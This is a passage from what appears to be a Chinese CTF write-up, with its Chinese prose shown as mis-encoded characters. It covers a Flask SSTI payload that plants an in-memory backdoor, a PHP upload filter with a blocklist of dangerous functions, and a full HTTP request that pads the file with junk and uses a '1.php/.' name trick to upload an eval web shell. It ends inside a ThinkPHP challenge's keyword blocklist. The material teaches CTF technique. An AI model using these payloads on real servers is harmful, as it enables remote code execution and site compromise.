å›æ˜¾ï¼Œé‚£ä¹ˆå°±æ˜¯flaskä¸‹çš„å†…å­˜é©¬äº†ï¼Œå¯¹å…³é”®å­—æœ‰äº›è¿‡æ»¤ï¼Œæ‹¼æ¥å³å¯ï¼payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config&#125;&#125;&#123;&#123;url<span class="built_in">_</span>for[&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;~&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>buil&#x27;~&#x27;tins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;ev&#x27;&#x27;al&#x27;](&quot;app.before<span class="built_in">_</span>request<span class="built_in">_</span>funcs.setdefault(None, []).append(lambda:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read())&quot;,&#123;&#x27;app&#x27;:url<span class="built_in">_</span>for[&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;~&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;current<span class="built_in">_</span>ap&#x27;~&#x27;p&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="å¥¶é¾™ç‰ŒWAF"><a href="#å¥¶é¾™ç‰ŒWAF" class="headerlink" title="å¥¶é¾™ç‰ŒWAF"></a>å¥¶é¾™ç‰ŒWAF</h2><p>ç»™å‡ºæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$fileExtension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>, PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$fileExtension</span>, <span class="string">&#x27;ph&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$fileExtension</span>, <span class="string">&#x27;hta&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ä¸å…è®¸ä¸Šä¼ æ­¤ç±»æ–‡ä»¶ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æ–‡ä»¶å¤§å°è¶…è¿‡é™åˆ¶ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="literal">false</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dangerous_patterns</span> = [</span><br><span class="line">            <span class="string">&#x27;/&lt;\?php/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;\?=/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;\?xml/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\b(eval|base64_decode|exec|shell_exec|system|passthru|proc_open|popen|php:\/\/filter|php_value|auto_append_file|auto_prepend_file|include_path|AddType)\b/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\b(select|insert|update|delete|drop|union|from|where|having|like|into|table|set|values)\b/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/--\s/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\/\*\s.*\*\//&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/#/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;script\b.*?&gt;.*?&lt;\/script&gt;/is&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/javascript:/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/on\w+\s*=\s*[&quot;\&#x27;].*[&quot;\&#x27;]/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/[\&lt;\&gt;\&#x27;\&quot;\\\`\;\=]/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/%[0-9a-fA-F]&#123;2&#125;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&amp;#[0-9]&#123;1,5&#125;;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&amp;#x[0-9a-fA-F]+;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/system\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/exec\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/passthru\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/shell_exec\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/file_get_contents\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/fopen\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/file_put_contents\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/%u[0-9A-F]&#123;4&#125;/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/[^\x00-\x7F]/&#x27;</span>,</span><br><span class="line">            <span class="comment">// æ£€æµ‹è·¯å¾„ç©¿è¶Š</span></span><br><span class="line">            <span class="string">&#x27;/\.\.\//&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$dangerous_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;å†…å®¹åŒ…å«å±é™©å­—ç¬¦ï¼Œä¸Šä¼ è¢«å¥¶é¾™æ‹¦æˆªï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$upload_dir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$new_file_name</span> = <span class="variable">$upload_dir</span> . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_file_name</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¿å­˜å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š&quot;</span> . <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹åç¼€åå’Œæ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œ<code>$file_content = file_get_contents($file[&#39;tmp_name&#39;], false, null, 0, 5000);</code>åªä¼šå¯¹å‰5000ä¸ªå­—ç¬¦è¿›è¡Œæ£€æµ‹ï¼Œäºæ˜¯å¯ä»¥ç”¨è„æ•°æ®ç»•è¿‡</p><p><code>move_uploaded_fileå‡½æ•°</code></p><blockquote><p>åœ¨ <code>move_upload_file()</code> å‡½æ•°ä¸­æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨æ–‡ä»¶ç§»åŠ¨æ—¶å¦‚æœæ–‡ä»¶åå­˜åœ¨ <code>/.</code>ï¼Œé‚£ä¼šè‡ªåŠ¨å°† <code>/.</code> å»æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¯¥ç‰¹æ€§æ¥ç»•è¿‡é»‘åå•çš„æ£€æµ‹ï¼Œä»è€Œå®ç°æ–‡ä»¶ä¸Šä¼ ã€‚</p></blockquote><p>æ‰€ä»¥expï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /?name=1.php/. HTTP/1.1</span><br><span class="line">Host: challenge.imxbt.cn:31272</span><br><span class="line">Content-Length: 5215</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://challenge.imxbt.cn:31272</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFClPxPRBk7fIw7Nh</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge.imxbt.cn:31272/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryFClPxPRBk7fIw7Nh</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload<span class="built_in">_</span>file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;?php @eval(<span class="built_in">$</span><span class="built_in">_</span>POST[&#x27;a&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryFClPxPRBk7fIw7Nh--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶ågetshellæ‹¿åˆ°flag</p><h2 id="æ¶æ„ä»£ç æ£€æµ‹å™¨"><a href="#æ¶æ„ä»£ç æ£€æµ‹å™¨" class="headerlink" title="æ¶æ„ä»£ç æ£€æµ‹å™¨"></a>æ¶æ„ä»£ç æ£€æµ‹å™¨</h2><p><a href="http://www.zipæ³„éœ²æºç /">www.zipæ³„éœ²æºç </a></p><p>tp6æ¡†æ¶ï¼Œç½‘ä¸Šæ²¡æ‰¾åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[\&quot;;&#x27;%\\\\]/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\~|\`|\#|\%|\^|\&amp;|\*|\-|\+|\[|\]|\_|\&lt;|\&gt;|\/|\?|\\\\/is&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$attack_log_file</span> = <span class="string">&#x27;/tmp/attack.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$attack_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;$attack_word=\&#x27;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/attack.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$attack_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;æ£€æµ‹åˆ°å±é™©ä»£ç : &#x27;</span>.<span class="variable">$attack_word</span>.<span class="string">&#x27;ï¼ï¼ï¼&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;æ¬¢è¿ä½¿ç”¨gxngxngxnçš„æ¶æ„ä»£ç æ£€æµ‹å™¨ï¼ï¼ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$safe_log_file</span> = <span class="string">&#x27;/tmp/safe.log&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$safe_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;$safe_word=&quot;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/safe.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$safe_word</span>))&#123;</span><br><span 